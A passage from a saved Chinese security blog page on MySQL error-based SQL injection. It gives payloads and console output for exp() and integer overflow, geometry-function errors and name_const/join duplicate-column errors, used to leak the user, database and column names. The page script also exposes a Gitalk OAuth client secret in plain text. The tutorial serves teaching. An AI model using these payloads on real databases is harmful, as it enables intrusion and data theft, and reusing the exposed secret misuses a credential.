class="mi">20</span><span class="p">))));</span>
+</code></pre></div></div>
+
+<p>利用extractvalue()报错和updatexml()报错均只能查询32及以内长度的字符，当超出32时，我们要结合mid()和substr()来进行注入。</p>
+
+<h1 id="数据溢出报错">数据溢出报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 数据溢出报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<h2 id="双精度溢出报错">双精度溢出报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%8F%8C%E7%B2%BE%E5%BA%A6%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 双精度溢出报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<p>Exp函数返回e的幂次方。在MySQL中。当传入的参数&gt;=710会报错。并且会返回报错信息。利用方法如下:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">));</span>
+</code></pre></div></div>
+<p>~表示按位取反操作，通俗的讲就是能把一个很小的数变成一个很大的数。比如~0=18446744073709551615，从而达到溢出的效果。</p>
+
+<h2 id="整型溢出报错">整型溢出报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 整型溢出报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="o">|</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="o">|</span> <span class="n">root</span><span class="o">@</span><span class="n">localhost</span>                   <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">!</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">-----------------------------------+</span>
+<span class="o">|</span> <span class="o">!</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------------------------------+</span>
+<span class="o">|</span>                                 <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">!</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------------------------------------+</span>
+<span class="o">|</span> <span class="o">!</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------+</span>
+<span class="o">|</span>                                   <span class="mi">2</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>因此，我们可以构造出如下的注入方式：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">~</span><span class="mi">0</span><span class="o">+!</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">);</span>
+<span class="k">select</span> <span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">!</span><span class="n">x</span><span class="o">-~</span><span class="mi">0</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
+</code></pre></div></div>
+<p><strong>当MySQL版本大于或等于5.5.53时，数据溢出注入无效</strong></p>
+
+<h1 id="几何函数报错">几何函数报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 几何函数报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">multipoint</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span>
+</code></pre></div></div>
+<p>5.7.17&lt; Mysql版本号&lt;= 5.5.48</p>
+
+<h1 id="列名重复报错">列名重复报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%88%97%E5%90%8D%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 列名重复报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<p>mysql列名重复会报错。name_const(name,value) 返回给定值。当用来产生一个结果集合列时，name_const促使该列使用给定名称。</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">name_const</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">--------+</span>
+<span class="o">|</span> <span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">20</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+</span>
+<span class="o">|</span>      <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+<p>构造重复的列</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="n">name_const</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="n">name_const</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">))</span><span class="n">a</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>高版本mysql修复了这个问题，要求第一个参数必须为常量，所以我们只能去查询user(),version()一些系统常量。<br>
+但在低版本中（Mysql 5.0.12 &lt;= 版本 &lt;= Mysql 5.0.51），可以成功利用。</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="n">name_const</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">),</span><span class="n">name_const</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">))</span><span class="n">a</span><span class="p">;</span>
+</code></pre></div></div>
+<p>利用join()函数可以用来爆列名</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'id'</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'username'</span>
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">user</span> <span class="n">a</span> <span class="k">join</span> <span class="n">users</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'password'</span>
+</code></pre></div></div>
+
+<p><strong>参考文章</strong><br>
+<a href="http://codeqi.top/2018/02/03/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">http://codeqi.top/2018/02/03/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a> <br>
+<a href="https://xz.aliyun.com/t/253#toc-4">https://xz.aliyun.com/t/253#toc-4</a><br>
+<a href="http://drops.blbana.cc/2016/10/16/mysql-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e5-8e-9f-e7-90-86/">http://drops.blbana.cc/2016/10/16/mysql-e6-8a-a5-e9-94-99-e6-b3-a8-e5-85-a5-e5-8e-9f-e7-90-86/</a><br>
+<a href="https://www.hackdoor.org/d/163-sql-mysql">https://www.hackdoor.org/d/163-sql-mysql</a></p>
+
+
+
+                <hr style="visibility: hidden;">
+
+                
+
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="https://www.v0n.top/2019/08/11/%E5%BD%A9%E8%99%B9%E8%A1%A8/" data-toggle="tooltip" data-placement="top" title="彩虹表">
+                        Previous<br>
+                        <span>彩虹表</span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="https://www.v0n.top/2019/08/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" data-toggle="tooltip" data-placement="top" title="宽字节注入学习">
+                        Next<br>
+                        <span>宽字节注入学习</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+		    
+		 
+                <!--Gitalk评论start  -->
+                
+                <!-- 引入Gitalk评论插件  -->
+                <link rel="stylesheet" href="./SQL报错注入 - Von的博客 _ Von Blog_files/gitalk.css">
+                <script src="./SQL报错注入 - Von的博客 _ Von Blog_files/gitalk.min.js.下載"></script>
+                <div id="gitalk-container"><div class="gt-container"><div class="gt-meta"><span class="gt-counts"><a class="gt-link gt-link-counts" href="https://github.com/VonLYC/issue/issues/16" target="_blank">0</a> 筆評論</span><div class="gt-user"><div class="gt-user-inner"><span class="gt-user-name">訪客</span><span class="gt-ico gt-ico-arrdown"><span class="gt-svg"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="1619"><path d="M511.872 676.8c-0.003 0-0.006 0-0.008 0-9.137 0-17.379-3.829-23.21-9.97l-251.277-265.614c-5.415-5.72-8.743-13.464-8.744-21.984 0-17.678 14.33-32.008 32.008-32.008 9.157 0 17.416 3.845 23.25 10.009l228.045 241.103 228.224-241.088c5.855-6.165 14.113-10.001 23.266-10.001 8.516 0 16.256 3.32 21.998 8.736 12.784 12.145 13.36 32.434 1.264 45.233l-251.52 265.6c-5.844 6.155-14.086 9.984-23.223 9.984-0.025 0-0.051 0-0.076 0z" p-id="1620"></path></svg></span></span></div></div></div><div class="gt-header"><a class="gt-avatar-github"><span class="gt-ico gt-ico-github"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64 524C64 719.602 189.356 885.926 364.113 947.017 387.65799 953 384 936.115 384 924.767L384 847.107C248.118 863.007 242.674 773.052 233.5 758.001 215 726.501 171.5 718.501 184.5 703.501 215.5 687.501 247 707.501 283.5 761.501 309.956 800.642 361.366 794.075 387.658 787.497 393.403 763.997 405.637 743.042 422.353 726.638 281.774 701.609 223 615.67 223 513.5 223 464.053 239.322 418.406 271.465 381.627 251.142 320.928 273.421 269.19 276.337 261.415 334.458 256.131 394.888 302.993 399.549 306.685 432.663 297.835 470.341 293 512.5 293 554.924 293 592.81 297.896 626.075 306.853 637.426 298.219 693.46 258.054 747.5 262.966 750.382 270.652 772.185 321.292 753.058 381.083 785.516 417.956 802 463.809 802 513.5 802 615.874 742.99 701.953 601.803 726.786 625.381 750.003 640 782.295 640 818.008L640 930.653C640.752 939.626 640 948.664978 655.086 948.665 832.344 888.962 960 721.389 960 524 960 276.576 759.424 76 512 76 264.577 76 64 276.576 64 524Z"></path>
+</svg>
+</span></span></a><div class="gt-header-comment"><textarea class="gt-header-textarea " placeholder="寫點什麼" style="overflow-x: hidden; overflow-wrap: break-word; resize: none; height: 71px;"></textarea><div class="gt-header-preview markdown-body hide"></div><div class="gt-header-controls"><a class="gt-header-controls-tip" href="https://guides.github.com/features/mastering-markdown/" target="_blank"><span class="gt-ico gt-ico-tip"><span class="gt-svg"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 366.949535c-16.065554 0-29.982212 13.405016-29.982212 29.879884l0 359.070251c0 16.167882 13.405016 29.879884 29.982212 29.879884 15.963226 0 29.879884-13.405016 29.879884-29.879884L541.879884 396.829419C541.879884 380.763865 528.474868 366.949535 512 366.949535L512 366.949535z" p-id="3083"></path>
+  <path d="M482.017788 287.645048c0-7.776956 3.274508-15.553912 8.80024-21.181973 5.525732-5.525732 13.302688-8.80024 21.181973-8.80024 7.776956 0 15.553912 3.274508 21.079644 8.80024 5.525732 5.62806 8.80024 13.405016 8.80024 21.181973 0 7.776956-3.274508 15.656241-8.80024 21.181973-5.525732 5.525732-13.405016 8.697911-21.079644 8.697911-7.879285 0-15.656241-3.274508-21.181973-8.697911C485.292295 303.301289 482.017788 295.524333 482.017788 287.645048L482.017788 287.645048z" p-id="3084"></path>
+  <path d="M512 946.844409c-239.8577 0-434.895573-195.037873-434.895573-434.895573 0-239.8577 195.037873-434.895573 434.895573-434.895573 239.755371 0 434.895573 195.037873 434.895573 434.895573C946.895573 751.806535 751.755371 946.844409 512 946.844409zM512 126.17088c-212.740682 0-385.880284 173.037274-385.880284 385.777955 0 212.740682 173.037274 385.777955 385.880284 385.777955 212.740682 0 385.777955-173.037274 385.777955-385.777955C897.777955 299.208154 724.740682 126.17088 512 126.17088z" p-id="3085"></path>
+</svg>
+</span><span class="gt-ico-text">支援 Markdown 語法</span></span></a><button class="gt-btn gt-btn-preview"><span class="gt-btn-text">預覽</span></button><button class="gt-btn gt-btn-login"><span class="gt-btn-text">使用 GitHub 登入</span></button></div></div></div><div class="gt-comments"><div style="position: relative;"></div><p class="gt-comments-null">成為首個留言的人吧！</p></div></div></div>
+                <!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 -->
+                <!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 -->
+                <script src="./SQL报错注入 - Von的博客 _ Von Blog_files/md5.min.js.下載"></script>
+                <script type="text/javascript">
+                    var gitalk = new Gitalk({
+                    clientID: 'ff22566f9426862ef6c8',
+                    clientSecret: 'c04c81f6db80f890cf38cd65bed298525aeaaa87',
+                    repo: 'issue',
+                    owner: 'VonLYC',
+                    admin: ['VonLYC'],
+                    distractionFreeMode: false,
+                    id: md5(location.pathname),
+                    });
+                    gitalk.render('gitalk-container');
+                </script>
+                
+                <!-- Gitalk end -->
+
+                
+
+                
+
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5 id="catalog">
+                        <a class="catalog-toggle" href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"><li class="h1_nav active"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%89%8D%E8%A8%80" rel="nofollow">前言</a></li><li class="h1_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99" rel="nofollow">主键重复报错</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#rand02%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86" rel="nofollow">rand(0)*2报错原理</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#rand2%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86" rel="nofollow">rand()*2报错原理</a></li><li class="h1_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E6%8A%A5%E9%94%99" rel="nofollow">xpath语法错误报错</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml%E6%8A%A5%E9%94%99" rel="nofollow">updatexml()报错</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#extractvalue%E6%8A%A5%E9%94%99" rel="nofollow">extractvalue()报错</a></li><li class="h1_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" rel="nofollow">数据溢出报错</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%8F%8C%E7%B2%BE%E5%BA%A6%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" rel="nofollow">双精度溢出报错</a></li><li class="h2_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99" rel="nofollow">整型溢出报错</a></li><li class="h1_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99" rel="nofollow">几何函数报错</a></li><li class="h1_nav"><a href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%88%97%E5%90%8D%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99" rel="nofollow">列名重复报错</a></li></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5 id="featured-tags"><a href="https://www.v0n.top/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Practice" title="Practice" rel="3">
+                                    Practice
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#SQL" title="SQL" rel="9">
+                                    SQL
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Web" title="Web" rel="20">
+                                    Web
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#CTF" title="CTF" rel="5">
+                                    CTF
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Crypto" title="Crypto" rel="3">
+                                    Crypto
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Docker" title="Docker" rel="1">
+                                    Docker
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#PHP" title="PHP" rel="4">
+                                    PHP
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E6%9D%82%E8%B0%88" title="杂谈" rel="1">
+                                    杂谈
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E7%BC%96%E7%A0%81" title="编码" rel="1">
+                                    编码
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Python" title="Python" rel="3">
+                                    Python
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E7%88%AC%E8%99%AB" title="爬虫" rel="1">
+                                    爬虫
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D" title="问题修复" rel="1">
+                                    问题修复
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Linux" title="Linux" rel="1">
+                                    Linux
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Math" title="Math" rel="1">
+                                    Math
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#SSRF" title="SSRF" rel="2">
+                                    SSRF
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#XXE" title="XXE" rel="1">
+                                    XXE
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#Flask" title="Flask" rel="1">
+                                    Flask
+                                </a>
+                            
+        				
+                            
+                				<a href="https://www.v0n.top/tags/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="反序列化" rel="1">
+                                    反序列化
+                                </a>
+                            
+        				
+        			</div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5 id="friends">FRIENDS</h5>
+                <ul class="list-inline">
+                    
+                        <li><a href="https://www.xdsec.org/">XDSEC</a></li>
+                    
+                        <li><a href="http://hed9eh0g.top/">Hed9eh0g</a></li>
+                    
+                        <li><a href="https://wsbfdzz.github.io/">小雨时宁</a></li>
+                    
+                        <li><a href="http://www.xdusund.com/">sund</a></li>
+                    
+                        <li><a href="https://icebagw.github.io/">icebag</a></li>
+                    
+                        <li><a href="http://39.105.105.208/">Wal1et</a></li>
+                    
+                        <li><a href="https://nopech.cn/">nopech</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+ <style>
+  table{
+    border-left:1px solid #000000;border-top:1px solid #000000;
+    width: 100%;
+    word-wrap:break-word; word-break:break-all;
+  }
+  table th{
+  text-align:center;
+  }
+  table th,td{
+    border-right:1px solid #000000;border-bottom:1px solid #000000;
+  }
+</style>
+	
+	
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+<!-- jQuery -->
+<!--<script src="/js/jquery.min.js "></script>-->
+<script src="./SQL报错注入 - Von的博客 _ Von Blog_files/jquery.min.js.下載"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+<!--<script src="/js/bootstrap.min.js "></script>-->
+<script src="./SQL报错注入 - Von的博客 _ Von Blog_files/bootstrap.min.js.下載"></script>
+<script src="./SQL报错注入 - Von的博客 _ Von Blog_files/canvas-nest.min.js.下載"></script><canvas id="c_n15" width="1296" height="673" style="position: fixed; top: 0px; left: 0px; z-index: -1; opacity: 0.5;"></canvas>
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+                    <!-- add jianshu add target = "_blank" to <a> by BY -->
+                    
+                    
+
+                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
+                    
+                    
+
+
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/VonLYC">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright © Von's Blog 2020
+                    <br>
+                    Theme on <a href="https://github.com/VonLYC/VonLYC.github.io.git">GitHub</a> |
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="100px" height="20px" src="./SQL报错注入 - Von的博客 _ Von Blog_files/github-btn.html">
+                    </iframe>
+                    <br>
+                    本站访客量为<span id="busuanzi_value_site_pv">5414</span>
+                    <br>
+                    </p><p class="copyright text-muted" id="count">我的博客已默默运行了373天18时56分1秒</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="cb-search-tool" style="position: fixed; top: 0px; bottom: 0px; left: 0px; right: 0px; opacity: 0.95; background-color: rgb(17, 17, 17); z-index: 9999; display: none;">
+        <input type="text" class="form-control cb-search-content" id="cb-search-content" style="position: fixed; top: 60px" placeholder="文章标题 日期 标签">
+
+        <div style="position: fixed; top: 16px; right: 16px;">
+        <img src="./SQL报错注入 - Von的博客 _ Von Blog_files/cb-close.png" id="cb-close-btn">
+        </div>
+    </div>
+
+    <div style="position: fixed; right: 16px; bottom: 20px;">
+        <img src="./SQL报错注入 - Von的博客 _ Von Blog_files/cb-search.png" id="cb-search-btn" title="双击ctrl试一下">
+    </div>
+
